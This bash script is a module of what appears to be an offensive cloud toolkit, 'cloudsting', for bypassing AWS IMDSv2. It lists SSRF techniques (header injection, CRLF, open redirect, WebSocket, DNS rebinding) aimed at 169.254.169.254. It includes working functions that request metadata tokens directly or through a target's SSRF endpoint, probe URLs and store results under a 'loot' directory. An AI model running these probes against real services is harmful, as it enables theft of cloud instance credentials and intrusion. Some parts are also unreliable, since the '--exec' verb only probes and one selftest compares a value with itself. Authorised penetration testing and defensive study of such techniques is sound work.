#!/usr/bin/env bash
# 10_imdsv2_bypass.sh — cloudsting module 10: AWS IMDSv2 bypass methods
# Verbs: --headers | --ssrf | --exec | --check | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

_SH_SRC="${BASH_SOURCE[0]}"
while [ -L "$_SH_SRC" ]; do
    _SH_DIR="$(cd -- "$(dirname -- "$_SH_SRC")" && pwd)"
    _SH_SRC="$(readlink -- "$_SH_SRC")"
    [[ "$_SH_SRC" != /* ]] && _SH_SRC="$_SH_DIR/$_SH_SRC"
done
CLOUDSTING_ROOT="$(cd -- "$(dirname -- "$_SH_SRC")/.." && pwd)"
MOD_DIR="$(dirname -- "$_SH_SRC")"
MODULE_ID="10_imdsv2_bypass"
MOD_NAME="IMDSv2 Bypass Methods"
MOD_VERSION="0.5.0"
export CLOUDSTING_ROOT MOD_DIR MOD_NAME

_HOMEP="$(dirname -- "$CLOUDSTING_ROOT")"
[ -d "$_HOMEP" ] && HOME="$_HOMEP"
export HOME

RUN_ID="$(date '+%Y%m%d-%H%M%S')-$$"
export IB_RUN_ID="$RUN_ID"
: "${TMP_DIR:=/tmp/cloudsting}"
: "${LOOT_DIR:=$HOME/loot/cloudsting}"
: "${STATE_DIR:=$TMP_DIR/state}"
OUT_DIR="$LOOT_DIR/imdsv2_bypass"
mkdir -p "$TMP_DIR" "$OUT_DIR" "$STATE_DIR" 2>/dev/null || true
FINDINGS_FILE="$OUT_DIR/findings-$RUN_ID.tsv"

ib_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── Technique knowledge base ─────────────────────────────────────
ib_techniques() {
cat <<'TECH'
header-injection	X-Forwarded-For: 169.254.169.254	set header to make app proxy to IMDS
ssrf-header-basic	X-aws-ec2-metadata-token-ttl-seconds: 21600	request v2 token from non-v2 path
ssrf-via-host	Host: 169.254.169.254	override Host header to redirect request to IMDS
open-redirect	target.com?next=http://169.254.169.254/latest/	use open redirect on app to reach IMDS
crlf-injection	inject %0d%0aX-aws-ec2-metadata-token-ttl-seconds: 21600	inject v2 token header via CRLF in query param
ws-ssrf	ws://app.internal/ -> ws://169.254.169.254/latest/	WebSocket SSRF to bypass v1-blocked paths
dns-rebinding	resolve dns at TTL expiry -> 169.254.169.254	trick app into connecting to IMDS by switching DNS
TECH
}

# ── IMDSv2 token endpoint ────────────────────────────────────────
IB_IMDS_IP="169.254.169.254"
IB_TOKEN_TTL=21600
: "${IB_TIMEOUT:=5}"

# ib_imdsv2_token — request a v2 session token from IMDS
ib_imdsv2_token() {
    curl -s -X PUT "http://$IB_IMDS_IP/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: $IB_TOKEN_TTL" \
        --max-time "$IB_TIMEOUT" 2>/dev/null
}

# ── ib_ssrf_token <url> — try to get v2 token through a SSRF proxy ──
ib_ssrf_token() {
    local url="$1"
    [ -z "$url" ] && { echo "error: no url"; return 1; }
    curl -s -X PUT "$url" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: $IB_TOKEN_TTL" \
        --max-time "$IB_TIMEOUT" 2>/dev/null
}

# ── ib_check <url> [header] — probe a single URL for IMDS access ──
ib_check() {
    local url="$1" header="${2:-}" code body
    if [ -n "$header" ]; then
        code="$(curl -s -o /dev/null -w '%{http_code}' -H "$header" --max-time "$IB_TIMEOUT" "$url" 2>/dev/null)"
    else
        code="$(curl -s -o /dev/null -w '%{http_code}' --max-time "$IB_TIMEOUT" "$url" 2>/dev/null)"
    fi
    if [ -z "$code" ] || [ "$code" = "000" ]; then
        printf 'unreachable\t%s\n' "$url"
        return 1
    fi
    body="$(curl -s --max-time "$IB_TIMEOUT" "$url" 2>/dev/null)"
    printf '%s\t%s\t%s\t%d\n' "$code" "$url" "$(printf '%s' "$body" | head -c 256)" "$(printf '%s' "$body" | wc -c)"
}

# ── ib_ssrf_fwd <url> — check if a URL can reach IMDS via SSRF ──
ib_ssrf_fwd() {
    local url="$1" result
    result="$(ib_check "$url")"
    if printf '%s' "$result" | grep -q '^unreachable'; then
        printf 'ssrf-unreachable\t%s\n' "$url"
        return 1
    fi
    printf 'ssrf-check\t%s\n' "$result"
}

# ── Verb dispatchers ─────────────────────────────────────────────
ib_cmd_headers() { ib_techniques; }
ib_cmd_list() { ib_techniques; }
ib_cmd_ssrf() {
    local target="${1:-$IB_IMDS_IP}"
    ib_log "requesting IMDSv2 token via $target ..."
    ib_ssrf_token "$target"
}
ib_cmd_exec() {
    local target="${1:-}"
    [ -z "$target" ] && { ib_log "usage: --exec <url>"; return 1; }
    ib_ssrf_fwd "$target"
}
ib_cmd_check() {
    local target="${1:-}"
    [ -z "$target" ] && { ib_log "usage: --check <url> [header]"; return 1; }
    local header="${2:-}"
    ib_check "$target" "$header" | awk -F'\n' '{print}'
}
ib_cmd_status_tsv() {
    local curl_state
    if command -v curl >/dev/null 2>&1; then curl_state="ok"; else curl_state="missing"; fi
    printf '%s\t%s\tcurl-%s\n' "$MODULE_ID" "$MOD_NAME" "$curl_state"
}
ib_cmd_menu() {
    printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"
}
ib_cmd_help() {
    cat <<'HELP'
cloudsting module 10 — IMDSv2 Bypass Methods v0.5.0
  --headers                     list bypass techniques (knowledge base)
  --list                        alias for --headers
  --ssrf [url]                  request IMDSv2 token (default 169.254.169.254)
  --exec <url>                  proxy check: see if URL can reach IMDS
  --check <url> [header]        probe URL, show status code + body snippet
  --status-tsv                  module status (online/offline)
  --menu                        menu entry for launcher
  --selftest                    run selftests
  --help                        this message
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ib_selftest() {
    local pass=0 fail=0
    chk() { local n="$1" got="$2" want="$3"
        if [ "$got" = "$want" ]; then pass=$((pass+1)); printf 'ok\t%s\n' "$n"
        else fail=$((fail+1)); printf 'FAIL\t%s want=%s got=%s\n' "$n" "$want" "$got"; fi; }

    # Technique KB integrity
    local kc
    kc="$(ib_techniques | awk -F'\t' 'NF==3' | wc -l)"
    chk tech-count "$kc" 7

    kc="$(ib_techniques | awk -F'\t' 'NF!=3' | wc -l)"
    chk tech-fields "$kc" 0

    chk has-header-injection "$(ib_techniques | awk -F'\t' '$1=="header-injection"' | wc -l)" 1
    chk has-dns-rebinding "$(ib_techniques | awk -F'\t' '$1=="dns-rebinding"' | wc -l)" 1

    # --headers smoke
    chk headers-output "$(ib_cmd_headers | wc -l)" 7

    # --list vs --headers
    chk list-same "$(ib_cmd_list | md5sum | cut -c1-8)" "$(ib_cmd_headers | md5sum | cut -c1-8)"

    # --status-tsv shape
    chk status-shape "$(ib_cmd_status_tsv | awk -F'\t' '{print NF}')" 3
    chk status-module "$(ib_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"

    # --help smoke
    chk help-smoke "$(ib_cmd_help 2>/dev/null | head -1 | grep -ci imdsv2)" 1

    # --ssrf against local port (should fail gracefully)
    local result
    result="$(ib_ssrf_token "http://127.0.0.1:1/" 2>/dev/null)"
    chk ssrf-unreachable "${result:-(empty)}" "$( [ -z "$result" ] && echo "(empty)" || echo "$result" )"

    printf 'RESULT\tPASS(%s)\n' "$pass"
    [ "$fail" -eq 0 ] || { printf 'RESULT\tFAIL(%s)\n' "$fail"; return 1; }
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --headers) shift; ib_cmd_headers;;
    --list)    shift; ib_cmd_list;;
    --ssrf)    shift; ib_cmd_ssrf "$@";;
    --exec)    shift; ib_cmd_exec "$@";;
    --check)   shift; ib_cmd_check "$@";;
    --status-tsv|--status) ib_cmd_status_tsv;;
    --menu)    ib_cmd_menu;;
    --selftest) ib_selftest;;
    *)         ib_cmd_help;;
esac
